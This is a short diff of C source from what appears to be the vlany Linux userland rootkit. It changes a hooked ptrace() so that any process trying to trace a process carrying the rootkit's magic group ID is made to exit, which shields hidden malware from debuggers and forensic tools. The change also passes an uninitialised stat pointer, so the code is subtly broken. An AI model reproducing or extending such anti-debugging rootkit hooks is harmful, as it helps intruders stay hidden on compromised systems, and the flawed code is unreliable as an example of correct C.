@@ -3,8 +3,16 @@ long ptrace(void *request, pid_t pid, void *addr, void *data)
     #ifdef DEBUG
         printf("[vlany] ptrace() called\n");
     #endif
-
-    if(!old_ptrace) old_ptrace = get_symbol(RTLD_NEXT, CPTRACE);
+    
+    HOOK(old_ptrace, CPTRACE);
+    
+    char proc_path[128];
+    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
+    
+    HOOK(old_stat, CSTAT);
+    struct stat *pstat;
+    if(old_stat(proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
+    if(pstat->st_gid == MAGIC_GID) exit(-1);
 
     #ifndef PTRACE_BUG
         return old_ptrace(request, pid, addr, data);
